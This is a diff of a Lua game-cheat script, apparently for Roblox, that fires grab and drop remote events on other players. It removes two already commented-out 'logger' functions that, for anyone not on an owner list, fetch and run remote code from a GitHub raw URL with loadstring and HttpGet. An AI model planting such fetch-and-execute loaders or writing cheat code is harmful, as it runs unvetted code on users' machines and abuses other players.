@@ -558,21 +558,7 @@ function BlobMassless(blob, target, side)
 		blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
 		blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args3))
 end
---[[
-function GfLogger()
-    id = {
-        [1] = true,
-    }
-if not id[plr.UserId] then
-        local success, errorMessage = pcall(function()
-             loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/Xeron/main/anti"))()
-        end)
 
-        if not success then
-        end
-    end
-end
-]]
 function flingF()
     workspace.ChildAdded:Connect(function(model)
         if model.Name == "GrabParts" then
@@ -6855,16 +6841,7 @@ local function GetPlayerRank(name)
     if table.find(GF, name) then return 6 end
     return 0
 end
---[[
-local function Logger()
-    if not table.find(Owner, LocalPlayer.Name) and LocalPlayer.UserId ~= 1 then
-        pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/Xeron/main/anti"))()
-        end)
-    end
-end
-Logger()
-]]
+
 
 local function findPlayer(text)
     if not text or text == "" then
